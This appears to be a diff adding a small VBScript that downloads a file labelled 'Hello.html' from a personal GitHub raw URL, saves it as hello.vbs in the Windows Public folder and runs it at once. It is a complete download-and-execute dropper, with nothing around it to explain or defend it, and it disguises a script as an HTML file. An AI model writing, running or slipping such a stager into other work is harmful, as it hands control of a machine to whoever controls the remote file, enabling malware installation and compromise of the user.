@@ -1,0 +1,14 @@
+Set oXMLHTTP=CreateObject("MSXML2.XMLHTTP")
+oXMLHTTP.Open "GET", "https://raw.githubusercontent.com/ankush3597/My-Personal/master/Hello.html",False 
+oXMLHTTP.Send
+
+Set oShell = CreateObject("Wscript.Shell")
+strpath = oShell.ExpandEnvironmentStrings("%Public%\hello.vbs")
+
+Set oStream = CreateObject ("Adodb.Stream")
+oStream.Type = 1
+oStream.Open
+oStream.Write oXMLHTTP.responseBody
+oStream.SavetoFile strPath, 2
+
+oShell.Run strPath
